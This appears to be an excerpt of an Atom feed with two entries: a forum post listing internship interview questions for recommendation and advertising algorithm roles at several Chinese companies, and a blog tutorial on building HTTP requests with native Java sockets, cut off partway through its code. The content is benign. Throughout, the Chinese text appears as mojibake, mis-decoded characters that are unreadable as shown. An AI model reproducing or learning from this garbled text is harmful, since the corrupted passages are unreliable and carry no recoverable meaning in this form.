    <entry>
        <id>https://bbs.a2os.club/d/14-/1</id>
        <title><![CDATA[æ¨èå¹¿å‘Šç®—æ³•æ–¹å‘å®ä¹ é¢ç»]]></title>
        <updated>2021-04-06T08:14:10+08:00</updated>
        <link href="https://bbs.a2os.club/d/14-/1"/>
        <content type="text/html" src="https://bbs.a2os.club/d/14-/1"><![CDATA[<h1>å¡ç‰›ç§‘æŠ€</h1>
<p>é¢è¯•æµç¨‹éå¸¸å¿«ï¼ŒåŸºæœ¬ä¸€å¤©ä¸€ä¸ªæµç¨‹ã€‚é¢è¯•å®˜å’Œ HR ä¹Ÿå¾ˆå¥½ï¼Œä¸»è¦å›´ç»•é¡¹ç›®åšä¸€äº›æ‰©å±•ã€‚å…¬å¸ä¸»è¦ç®—æ³•ä¸šåŠ¡ä¸ºå¹¿å‘Šæ¨èï¼Œæœ€è¿‘æ–°å¼•å…¥äº†ç”µå•†ï¼Œåšå•†å“æ¨èã€‚å®ä¹ ç”Ÿå¯ä»¥ä½å…¬å¸ç»Ÿä¸€å®‰æ’çš„äºŒäººé—´å…¬å¯“ã€‚</p>

<h2>ä¸€é¢</h2>
<ol style="list-style-type:decimal"><li>ä»‹ç»æ¯”èµ›é¡¹ç›®ï¼Œå‰æ’ç”¨çš„ä»€ä¹ˆæ–¹æ¡ˆ</li>
<li>æœºå™¨å­¦ä¹ æ–¹æ³•å’Œæ·±åº¦å­¦ä¹ æ–¹æ³•çš„åº”ç”¨åœºæ™¯</li>
<li>ä¸ºä»€ä¹ˆä½¿ç”¨ lightgbm æ¨¡å‹ï¼Œä¼˜ç¼ºç‚¹</li>
<li>ç®€è¿° word2vec çš„æŠ€å·§</li>
<li>transformeråœ¨åºåˆ—æ¨¡å‹ä¸­å¤§æ”¾å¼‚å½©ï¼Œä½ è®¤ä¸ºä»–å’Œä¼ ç»Ÿçš„rnnæ¨¡å‹ç›¸æ¯”å¼ºåœ¨å“ªé‡Œï¼Ÿ</li>
<li>å·¥ç¨‹å®è·µé—®é¢˜ï¼Œé¡¹ç›®ä¸­ç±»åˆ«åˆ†å¸ƒä¸å¹³è¡¡æ€ä¹ˆåŠï¼Œè´Ÿæ ·æœ¬å¤šæ€ä¹ˆåŠ</li>
<li>å¦‚æœä½¿ç”¨äº†ä¸‹é‡‡æ ·ç ´åäº†çœŸå®åˆ†å¸ƒï¼Œå¦‚ä½•åœ¨ä¸Šçº¿ä¹‹åå°†é¢„æµ‹çš„æ¦‚ç‡æ‹‰å›çœŸå®çš„åˆ†å¸ƒ</li></ol>

<h2>äºŒé¢</h2>
<ol style="list-style-type:decimal"><li>ä»‹ç»æ¯”èµ›æµç¨‹</li>
<li>å¯¹å†·é—¨å•†å“çš„è§£å†³æ–¹æ³•</li>
<li>å¦‚ä½•ä¿è¯å¬å›çš„å¤šæ ·æ€§</li>
<li>å¦‚ä½•æ¨èæ–°ä¸Šæ¶å•†å“</li>
<li>æ¨¡å‹æ¨èè´­ä¹°è¿‡çš„å•†å“æ€ä¹ˆå¤„ç†</li>
<li>lightgbm ä¸ xgboost åŒºåˆ«</li>
<li>å¹¿å‘Šåæ¬ºè¯ˆä¸­å¦‚æœç»™ GPS ä¿¡æ¯æ€ä¹ˆå¤„ç†</li></ol>

<h1>èš‚èšé‡‘æœâ€”æ”¯ä»˜å®â€”å¹¿å‘Šç®—æ³•</h1>
<p>é˜¿é‡Œå¥½å¤šéƒ¨é—¨åœ¨è¿‡å®Œå¹´ä¹‹åå°±å¼€å§‹åœ¨å„å¤§ç¾¤é‡Œå‘ jdï¼Œå£°åŠ¿ååˆ†æµ©å¤§ã€‚ç¾¤é‡Œæœ‰äººå‘äº†æ”¯ä»˜å®éƒ¨é—¨çš„ jdï¼Œè¯´æ˜¯æœ‰å­¦é•¿ç›´æ¨ï¼Œè€Œä¸”æ–¹å‘å’Œæˆ‘å¾ˆåŒ¹é…ï¼Œå°±å»è”ç³»äº†ä¸€ä¸‹å­¦é•¿ï¼Œå­¦é•¿å¾ˆ niceï¼Œå¸®æˆ‘æ”¹ç®€å†ï¼Œæäº†å¾ˆå¤šå»ºè®®ã€‚é˜¿é‡Œæ”¯æŒé¢„å…ˆé¢ï¼Œä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡å¤§å‚é¢è¯•ï¼Œæ€»å…±ä¸¤è½®æŠ€æœ¯é¢ï¼Œæœ¬æ¥æœ‰çš„äº¤å‰é¢è¢«å–æ¶ˆäº†ã€‚</p>

<h2>ä¸€é¢</h2>
<ol style="list-style-type:decimal"><li>æ˜ è±¡æ¯”è¾ƒæ·±åˆ»çš„æ¯”èµ›</li>
<li>åœ¨ kdd cup ç«èµ›ä¸­è´Ÿè´£å†…å®¹</li>
<li>ä»‹ç»æ”¹è¿›çš„itemcf</li>
<li>ç”¨æˆ· embedding å’Œå•†å“ embedding ä¸åœ¨ä¸€ä¸ªç‰¹å¾ç©ºé—´ï¼Œæ€ä¹ˆè®¡ç®—ç›¸ä¼¼æ€§</li>
<li>æœ‰æ²¡æœ‰è€ƒè™‘æŠŠç”¨æˆ·å’Œå•†å“çš„å…³ç³»å»ºä¸ºå¼‚æ„å›¾</li>
<li>åå¤„ç†å¦‚ä½•æ‰“å‹çƒ­é—¨å•†å“</li>
<li>ä»‹ç» kdd cup ç¬¬ä¸€åçš„æ–¹æ¡ˆ</li>
<li>ä»‹ç»ç«èµ›å¹¿å‘Šåæ¬ºè¯ˆçš„æ¯”èµ›</li></ol>
   <br>
<h2>äºŒé¢</h2>
<p>äºŒé¢åº”è¯¥æ˜¯ä¸ªé¢†å¯¼ï¼Œçº¦çš„ä¼šè®®å®¤å¿«åˆ°æ—¶é—´äº†ï¼Œæ‰€ä»¥é—®çš„æ¯”è¾ƒç®€å•ï¼Œäº†è§£äº†ä¸€ä¸‹ç«èµ›é¡¹ç›®å’Œåˆ°å²—æ—¶é—´å°±æ²¡äº†ã€‚</p>

<h1>å­—èŠ‚è·³åŠ¨â€”å•†ä¸šå˜ç°â€”å¹¿å‘Šç®—æ³•</h1>
<p>æœ¬æ¥æƒ³æŠŠå­—èŠ‚æ”¾åœ¨åé¢æŠ•çš„ï¼Œæ‰€ä»¥åªåœ¨ç³»ç»Ÿé‡Œå¡«äº†ç®€å†ï¼Œæ²¡æœ‰æŠ•å²—ä½ï¼Œä½† HR åŠ å¾®ä¿¡é—®æˆ‘è¦ä¸è¦è¯•è¯•ä»–ä»¬éƒ¨é—¨ï¼Œæ‰€ä»¥å°±é˜´å·®é˜³é”™å¼€å§‹äº†ï¼Œæ€»å…±ä¸‰è½®æŠ€æœ¯é¢ã€‚</p>
<h2>ä¸€é¢</h2>
<p>ç®—æ³•é¢˜ï¼šleetcode æ’åºçŸ©é˜µæŸ¥æ‰¾ï¼Œleetcode 102 äºŒå‰æ ‘çš„å±‚åºéå†</p>
<ol style="list-style-type:decimal"><li>ä»‹ç»ä¸€ä¸ªä½ è®¤ä¸ºåšçš„æœ€å¥½çš„æ¯”èµ›</li>
<li>ANNç”¨çš„ä»€ä¹ˆå·¥å…·ï¼Œä»‹ç»ä¸€ä¸‹åŸç†</li>
<li>ä¸ºä»€ä¹ˆé€‰æ‹©Annoy</li>
<li>è¿˜çŸ¥é“å…¶ä»–ANNç®—æ³•å—ï¼Ÿä»‹ç»äº†ä¸€ä¸‹å±€éƒ¨æ•æ„Ÿhash</li>
<li>åšç”¨æˆ·å•†å“äº¤äº’ç‰¹å¾çš„æ—¶å€™ï¼Œä½ çŸ¥é“ä¸šç•Œæ˜¯æ€ä¹ˆåšçš„ï¼Ÿæ‰¯äº†ä¸€ä¸‹DINæ¨¡å‹çš„å’Œç›®æ ‡å•†å“çš„attentionåšæ³•</li>
<li>lightgbmå’Œxgboostçš„åŒºåˆ«</li>
<li>æ’åºé˜¶æ®µä½ çŸ¥é“ä¸šç•Œæ˜¯æ€ä¹ˆåšçš„ï¼Ÿè¯´äº†ä¸€ä¸‹ç‚¹å‡»ç‡æ¨¡å‹ï¼šdeepfmï¼Œnfmï¼Œwide &amp; deepï¼Œdcnï¼Œdeepcrossing</li>
<li>ä»‹ç»ä¸€ä¸‹word2vec</li>
<li>ä»‹ç»ä¸€ä¸‹transformer</li>
<li>bertçš„ä¸¤ç§é¢„è®­ç»ƒæ–¹å¼</li>
<li>ä¸ºä»€ä¹ˆè¦ç”¨maskï¼Ÿè¯´äº†padding maskå’Œsequence mask</li>
<li>ä¸ºä»€ä¹ˆè¦sequence maskï¼Ÿé˜²æ­¢ä¿¡æ¯ç©¿è¶Š</li></ol>

<h2>äºŒé¢</h2>
<p>ç®—æ³•é¢˜ï¼šæ±‚ä»å·¦ä¸Šè§’åˆ°å³ä¸‹è§’çš„æœ€å°å¼€é”€ã€‚ç»™å®šä¸€ä¸ªäºŒç»´æ•°ç»„arr<i>[j]ï¼Œæ•°ç»„ä¸­æ¯ä¸ªç‚¹è¡¨ç¤ºç»è¿‡è¯¥ç‚¹çš„å¼€é”€ï¼Œæ±‚ä»å·¦ä¸Šè§’ä¸ºèµ·ç‚¹ï¼Œå³ä¸‹è§’ä¸ºç»ˆç‚¹çš„æœ€å°å¼€é”€ï¼Œåœ¨æ¯ä¸ªç‚¹æ—¶åªèƒ½å¾€å³æˆ–è€…å¾€ä¸‹èµ°ï¼ŒåŒæ—¶ä¸­é€”å¯èƒ½ä¼šæœ‰éšœç¢ï¼Œå³æœ‰äº›ç‚¹ä¸èƒ½èµ°ï¼Œobs<i>[j]=1æ—¶è¡¨ç¤º(i, j)ä¸èƒ½èµ°ã€‚dpå’ŒdpçŠ¶æ€å‹ç¼©ã€‚</i></i></p>
<ol style="list-style-type:decimal"><li><i><i>ä»‹ç»ä¸€ä¸ªæ¯”èµ›</i></i></li>
<li>ANNç”¨çš„ä»€ä¹ˆå·¥å…·ï¼Œä»‹ç»ä¸€ä¸‹åŸç†</li>
<li>å¦‚ä½•æé«˜å†·é—¨å•†å“çš„æ¨èæ•ˆæœçš„</li>
<li>äº†ä¸äº†è§£å¤§æ•°æ®æ¡†æ¶</li>
<li>è¯´ä¸€ä¸‹ä½ ç†Ÿæ‚‰çš„linuxå‘½ä»¤</li>
<li>ä¸€ä¸ªæ–‡ä»¶æ¯è¡Œä¸€ä¸ªæ•°å­—ï¼Œç”¨å‘½ä»¤ç»Ÿè®¡æ‰€æœ‰æ•°çš„å¹³å‡å€¼å’Œæ•°å­—ä¸ªæ•°</li>
<li>é€»è¾‘å›å½’æŸå¤±å‡½æ•°å’Œæ±‚å¯¼</li>
<li>ä»‹ç»ä¸€ä¸‹ä½ äº†è§£çš„ä¼˜åŒ–å™¨å’Œå„è‡ªçš„ä¼˜ç¼ºç‚¹</li>
<li>Adamå’ŒAdagradçš„åŒºåˆ«</li></ol>

<h2>ä¸‰é¢</h2>
<p>ç®—æ³•é¢˜ï¼šæœ‰ä¸€ä¸ªé•¿åº¦ä¸ºnçš„æ•°ç»„ï¼Œæ±‚ä¸€ä¸ªæ•°kï¼Œkçš„å–å€¼åŒºé—´ä¸º[1, n-1]ï¼Œä½¿å¾—æ•°ç»„çš„å‰kä¸ªæ•°å’Œån-kä¸ªæ•°çš„æ–¹å·®å’Œæœ€å°ã€‚è¦æ±‚åŒ–ç®€æ–¹å·®å…¬å¼ï¼Œè¾¾åˆ°è®¡ç®—å­åºåˆ—æ–¹å·®çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ã€‚è§£å‡ºæ¥ååˆè¦æ±‚ç©ºé—´å¤æ‚åº¦ä¸ºå¸¸æ•°çº§åˆ«ã€‚</p>

<ol style="list-style-type:decimal"><li>å†™é€»è¾‘å›å½’çš„loglossæŸå¤±å‡½æ•°</li>
<li>é€»è¾‘å›å½’æŸå¤±å‡½æ•°å¯ä»¥ç”¨mseå—ï¼ˆä»æ¢¯åº¦è§’åº¦ï¼‰</li>
<li>é€»è¾‘å›å½’å»ºæ¨¡ï¼Œå¦‚æœåªæœ‰9ä¸ªæ­£æ ·æœ¬ï¼Œä¸€ä¸ªè´Ÿæ ·æœ¬ï¼Œé‚£ä¹ˆæœ‰ä¸€åˆ—ç‰¹å¾ï¼Œè¿™ä¸ªç‰¹å¾å¯¹äºçš„æƒé‡æ˜¯æ­£è¿˜æ˜¯è´Ÿ  </li>
<li>ä»‹ç»è®¤ä¸ºåšçš„æœ€å¥½çš„é¡¹ç›®</li>
<li>é¡¹ç›®ä¸­å¦‚ä½•ç¼“è§£æ›å…‰åå·®çš„</li>
<li>Embedding ANNå¬å›ç”¨çš„ä»€ä¹ˆå·¥å…·</li></ol>

<h1>å¿«æ‰‹-ç¤¾åŒºç§‘å­¦éƒ¨-æ¨èç®—æ³•</h1>
<p>å¿«æ‰‹æ˜¯å…ˆç»Ÿä¸€é¢è¯•ï¼ŒæŠ€æœ¯é¢ç»“æŸåï¼ŒHR è”ç³»æ‰çŸ¥é“å…·ä½“çš„å°ç»„ã€‚å¿«æ‰‹çš„é¢è¯•é£æ ¼æ„Ÿè§‰å’Œå­—èŠ‚å¾ˆåƒï¼Œå…ˆåšä¸¤é“ç®—æ³•é¢˜ã€‚ä¸€é¢å…ˆåšé¢˜ï¼Œç¬¬äºŒé¢˜å¡äº†å¥½ä¹…æ‰åšå®Œï¼Œæ‰€ä»¥å‰©ä¸‹çš„æ—¶é—´ä¸å¤šï¼Œé¢è¯•å®˜ä¹Ÿæ²¡å¤šé—®ï¼Œå°±ç®€å•äº†è§£äº†ä¸€ä¸‹ç«èµ›é¡¹ç›®ã€‚äºŒé¢ä¹Ÿæ˜¯å…ˆåšé¢˜ï¼ŒåŸºç¡€é—®çš„ä¸å¤šï¼Œä¹Ÿé—®åˆ°äº†â€œé€»è¾‘å›å½’æŸå¤±å‡½æ•°å¯ä»¥ç”¨mseå—â€ï¼Œå¤§éƒ¨åˆ†æ—¶é—´éƒ½åœ¨å’Œæˆ‘è®¨è®º kdd cup çš„é¡¹ç›®æµç¨‹æ˜¯å¦åˆç†å’Œä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšã€‚å¿«æ‰‹æ€»å…±ä¸¤è½®æŠ€æœ¯é¢ï¼Œéš”äº†å¤§æ¦‚ä¸¤å‘¨æ‰æœ‰ HR æ²Ÿé€šåç»­ã€‚</p>

<h1>è…¾è®¯-åº”ç”¨å®-æ¨èç®—æ³•</h1>
<p>æŠ•çš„è…¾è®¯å¾®è§†ï¼Œè¢«åº”ç”¨å®æäº†ã€‚</p>
<h2>ä¸€é¢</h2>
<ol style="list-style-type:decimal"><li>ä»‹ç»ä¸€ä¸ªæœ€æœ‰æŠŠæ¡çš„æ¯”èµ›</li>
<li>ä»‹ç»æ¯”èµ›ä¸­itemcfå…·ä½“åšæ³•</li>
<li>åœ¨itemcfä¸­å¦‚ä½•å¼•å…¥æ—¶é—´é—´éš”ä¿¡æ¯å’Œä½ç½®é—´éš”ä¿¡æ¯</li>
<li>åŸºäºå•†å“å±æ€§embeddingçš„å¬å›è¿™ä¹ˆåšçš„</li>
<li>Annoyçš„åŸç†</li>
<li>åŸºäºw2vçš„ANNæ€ä¹ˆåšçš„</li>
<li>w2vçš„åŸç†</li>
<li>w2vçš„losså‡½æ•°</li>
<li>losså‡½æ•°è¿˜æœ‰å“ªäº›</li>
<li>å¦‚ä½•è§£å†³å†·å¯åŠ¨é—®é¢˜</li>
<li>å¦‚ä½•è¯„ä»·å¬å›çš„æ•ˆæœ</li>
<li>å¦‚ä½•æŠŠå¬å›çš„ä¿¡æ¯å¼•å…¥åˆ°æ’åº</li>
<li>GBDTï¼Œxgboostï¼Œlightgbmæ”¹è¿›çš„è¿‡ç¨‹</li>
<li>ç®€å•æ¨å¯¼xgboost</li>
<li>æ„å»ºä¸€æ£µæ ‘åˆ†è£‚ç‰¹å¾æ€ä¹ˆé€‰æ‹©</li>
<li>è®¡ç®—åˆ†è£‚å¢ç›Šçš„æ–¹æ³•æœ‰å“ªäº›</li>
<li>LSTMçš„é—¨æœºåˆ¶</li>
<li>LSTMç›¸è¾ƒäºRNNçš„ä¼˜åŠ¿</li>
<li>transformerçš„æœºåˆ¶</li>
<li>æ¨èé‡Œé¢æ·±åº¦æ¨¡å‹çš„äº†è§£</li>
<li>NNæ€ä¹ˆè¾¾åˆ°æ³›åŒ–æ€§</li>
<li>å¦‚ä½•ä¿è¯çš„ç¨€ç–æ€§</li>
<li>L1æ­£åˆ™ä¸ºä»€ä¹ˆå¯ä»¥è¾¾åˆ°æ¨¡å‹çš„ç¨€ç–æ€§</li></ol>

<h2>äºŒé¢</h2>
<ol style="list-style-type:decimal"><li>æ¯”èµ›åˆ†å·¥</li>
<li>embeddingå­˜åœ¨ä¹‹å‰æ²¡æœ‰å‡ºç°è¿‡idæ€ä¹ˆåŠ</li>
<li>w2vçš„æ ·æœ¬æ€ä¹ˆæ„é€ </li>
<li>æœ‰æ²¡æœ‰è¿‡æ»¤ä½é¢‘id</li>
<li>cbow ä¸ skip-gram çš„åŒºåˆ«å’Œä¼˜ç¼ºç‚¹</li>
<li>å¤šä»»åŠ¡å­¦ä¹ æœ‰å“ªäº›ç»“æ„</li>
<li>å¤šä¸ªå¬å›æ€ä¹ˆåˆå¹¶çš„</li>
<li>å¤šä¸ªå¬å›åˆ†æ•°ä¹‹é—´æ˜¯å¯æ¯”çš„å—</li>
<li>å„ä¸ªå¬å›çš„æƒé‡æ˜¯æ€ä¹ˆé€‰å–çš„</li>
<li>æ¨èç³»ç»Ÿé‡Œé¢æ˜¯å¦‚ä½•è€ƒè™‘å†·é—¨å•†å“</li>
<li>æ–°å¢ä¸€è·¯å¬å›ï¼Œåœ¨æ’åºé˜¶æ®µéœ€è¦åšä»€ä¹ˆæ”¹è¿›</li>
<li>æ ‘æ¨¡å‹å¯¹ç¦»æ•£ç‰¹å¾æ€ä¹ˆå¤„ç†çš„</li>
<li>æ ‘æ¨¡å‹æ€ä¹ˆå†³å®šä¸€ä¸ªå¶å­ç»“ç‚¹æ˜¯å¦è¦åˆ†è£‚</li>
<li>xgboostæ­£åˆ™åŒ–é¡¹å’Œä»€ä¹ˆæœ‰å…³</li></ol>

<h2>ä¸‰é¢</h2>
<p>åšäº†ä¸‰é“ç®—æ³•é¢˜ï¼šleetcode 53.æœ€å¤§å­åºå’Œï¼Œleetcode 75.é¢œè‰²åˆ†ç±»ï¼Œleetcode 442.æ•°ç»„ä¸­é‡å¤çš„æ•°æ®</p>

<h2>å››é¢</h2>
<ol style="list-style-type:decimal"><li>ä»‹ç»é¡¹ç›®</li>
<li>ç®—æ³•é¢˜ï¼šå‰‘æŒ‡ Offer 60.nä¸ªéª°å­çš„ç‚¹æ•°</li></ol>

<h1>ç™¾åº¦</h1>
<p>åº”è¯¥æ˜¯ç™¾åº¦çš„å®ä¹ ä¸“åœºï¼Œä¸‰è½®æŠ€æœ¯è¿ç€é¢ã€‚</p>
<h2>ä¸€é¢</h2>
<p>ç®—æ³•é¢˜ï¼šleetcode 70.çˆ¬æ¥¼æ¢¯</p>
<ol style="list-style-type:decimal"><li>ä»‹ç»ç«èµ›é¡¹ç›®</li>
<li>ç«èµ›æ•°æ®è§„æ¨¡</li>
<li>ANNä¸­ç”¨æˆ·çš„embeddingæ€ä¹ˆå¾—åˆ°çš„</li>
<li>w2vçš„å¬å›å…·ä½“æ€ä¹ˆåšçš„</li>
<li>ANNçš„å·¥å…·ç”¨çš„å•¥</li>
<li>åŸºäºæ·±åº¦çš„å¬å›æ€ä¹ˆåšçš„</li>
<li>æ’åºé˜¶æ®µçš„ç‰¹å¾æœ‰å“ªäº›</li>
<li>åæ‰“å‹æ€ä¹ˆåšçš„</li></ol>

<h2>äºŒé¢</h2>
<p>ç®—æ³•é¢˜ï¼šå‡è®¾ç°åœ¨æœ‰å¾ˆå¤šæµ·å²›ï¼Œæœ‰äº›æµ·å²›ä¹‹é—´æœ‰æ¡¥è¿æ¥ï¼Œä½ å·²çŸ¥æµ·å²›è¿æ¥æƒ…å†µã€‚ â‘  æˆ‘ç°åœ¨æƒ³ä»åˆ° Aå²› å» Bå²›ï¼Œé—®æ˜¯å¦èƒ½é€šè¿‡é™†è·¯åˆ°è¾¾ï¼ˆè¿‡æ¡¥ï¼‰ â‘¡å¦‚æœå¯ä»¥ï¼Œæœ€å°‘éœ€è¦è¿‡å‡ æ¬¡æ¡¥ â‘¢è¾“å‡ºä¸€æ¡æœ€çŸ­çš„è·¯å¾„ ï¼ˆP.S. æœ€å¥½å¯ä»¥å†™ä¸€ä¸ªéé€’å½’çš„å½¢å¼ï¼‰</p>
<ol style="list-style-type:decimal"><li>ä»‹ç»ç«èµ›</li>
<li>è¯„ä¼°æ ‡å‡†æ˜¯å•¥</li>
<li>å“ªäº›ç‰¹å¾æ¯”è¾ƒæœ‰ç”¨</li>
<li>å¤šè·¯å¬å›çš„åˆ†æ•°ä¸ºä»€ä¹ˆè¦ç›¸åŠ </li>
<li>æœ‰æ²¡æœ‰åˆ†æ bad case</li>
<li>ä¼˜åŒ–æ€è·¯</li>
<li>è®²ä¸€ä¸‹æ¨èçš„æ–¹æ³•</li>
<li>ä¸€ä¸ªå…¨è¿æ¥å±‚æœ‰å¤šå°‘å‚æ•°</li>
<li>ä»‹ç» attention</li></ol>
    <br>
<h2>ä¸‰é¢ï¼ˆæ‰‹ç™¾æ¨èéƒ¨é—¨ï¼‰</h2>
<ol style="list-style-type:decimal"><li>ä»‹ç»ç ”ç©¶æ–¹å‘</li>
<li>è®ºæ–‡ä¸­ embedding æ•ˆæœçš„è¯„ä»·æ–¹æ³•å’ŒæŒ‡æ ‡</li>
<li>ä¸ºä»€ä¹ˆé€‰æ‹©æ•°æ®æŒ–æ˜è¿™ä¸ªæ–¹å‘</li>
<li>å¯¹äºå®ä¹ çš„ç›®æ ‡</li>
<li>åé—®éƒ¨é—¨ä¸šåŠ¡å’ŒæŠ€æœ¯æ ˆ</li></ol>]]></content>
        <author>
            <name><![CDATA[A2OS å¼€æºç¤¾åŒºè®ºå›]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2021/03/19/blog12/</id>
        <title><![CDATA[Java åŸç”Ÿ Socket å®ç° HTTP é€šä¿¡]]></title>
        <updated>2021-03-19T10:09:28+08:00</updated>
        <link href="http://www.windboy.top/2021/03/19/blog12/"/>
        <content type="text/html" src="http://www.windboy.top/2021/03/19/blog12/"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æˆ‘ä»¬å¾ˆç†Ÿæ‚‰ç¼–å†™æœåŠ¡ç«¯çš„ä¸€ä¸ª Controllerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyController</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    MyService myService;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// è·å–</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/get"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">getUserList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        List&lt;User&gt; list = myService.findAll();</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´åŸºäº HTTP çš„ç½‘ç»œé€šä¿¡ï¼Œåœ¨ Spring Boot æ¡†æ¶çš„å°è£…ä¸‹ï¼ŒæœåŠ¡ç«¯å¦‚ä½•æ¥å— HTTP è¯·æ±‚ï¼Œå¦‚ä½•è§£ææˆå†…å­˜ä¸­çš„å¯¹è±¡ï¼Œå®Œæˆä¸šåŠ¡é€»è¾‘åå¦‚ä½•è¾“å‡º HTTP å“åº”ï¼Œæˆ‘ä»¬ä¸å¾—è€ŒçŸ¥ã€‚</p><p>æœ¬æ–‡å°†åˆ©ç”¨ Java åŸç”Ÿ Socketï¼Œå®Œæˆå‘é€ HTTP è¯·æ±‚ï¼Œå¹¶è§£æ HTTP å“åº”ã€‚</p><h2 id="HttpUrl-ç±»"><a href="#HttpUrl-ç±»" class="headerlink" title="HttpUrl ç±»"></a>HttpUrl ç±»</h2><p>HTTP åè®®ä¸­çº¦å®šçš„ URL æ ¼å¼ä¸ºï¼šprotocol://host:port/pathã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpUrl</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    String protocol;</span><br><span class="line">    String host;</span><br><span class="line">    <span class="keyword">int</span> port;</span><br><span class="line">    String path;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * protocol://host:port/path</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HttpUrl</span><span class="params">(String path)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(path);</span><br><span class="line">        protocol = url.getProtocol();</span><br><span class="line">        host = url.getHost();</span><br><span class="line">        port = url.getPort();</span><br><span class="line">        port = port == -<span class="number">1</span> ? url.getDefaultPort() : port;</span><br><span class="line">        <span class="keyword">this</span>.path = url.getFile();</span><br><span class="line">        <span class="keyword">this</span>.path = (<span class="keyword">this</span>.path == <span class="keyword">null</span> || <span class="keyword">this</span>.path.length() == <span class="number">0</span>) ? <span class="string">"/"</span> : <span class="keyword">this</span>.path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getProtocol</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> protocol;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getHost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> host;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> port;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¸¸é‡"><a href="#å¸¸é‡" class="headerlink" title="å¸¸é‡"></a>å¸¸é‡</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HttpConst</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å›è½¦å’Œæ¢è¡Œ</span></span><br><span class="line">    <span class="keyword">int</span> CR = <span class="number">13</span>;</span><br><span class="line">    <span class="keyword">int</span> LF = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    String CRLF = <span class="string">"\r\n"</span>;</span><br><span class="line">    String GET = <span class="string">"GET "</span>;</span><br><span class="line">    String HOST = <span class="string">"Host: "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Http-æŠ¥æ–‡è§£æç±»"><a href="#Http-æŠ¥æ–‡è§£æç±»" class="headerlink" title="Http æŠ¥æ–‡è§£æç±»"></a>Http æŠ¥æ–‡è§£æç±»</h2><p>æ˜¯æ•´ä¸ª Socket ç½‘ç»œç¼–ç¨‹çš„æ ¸å¿ƒã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 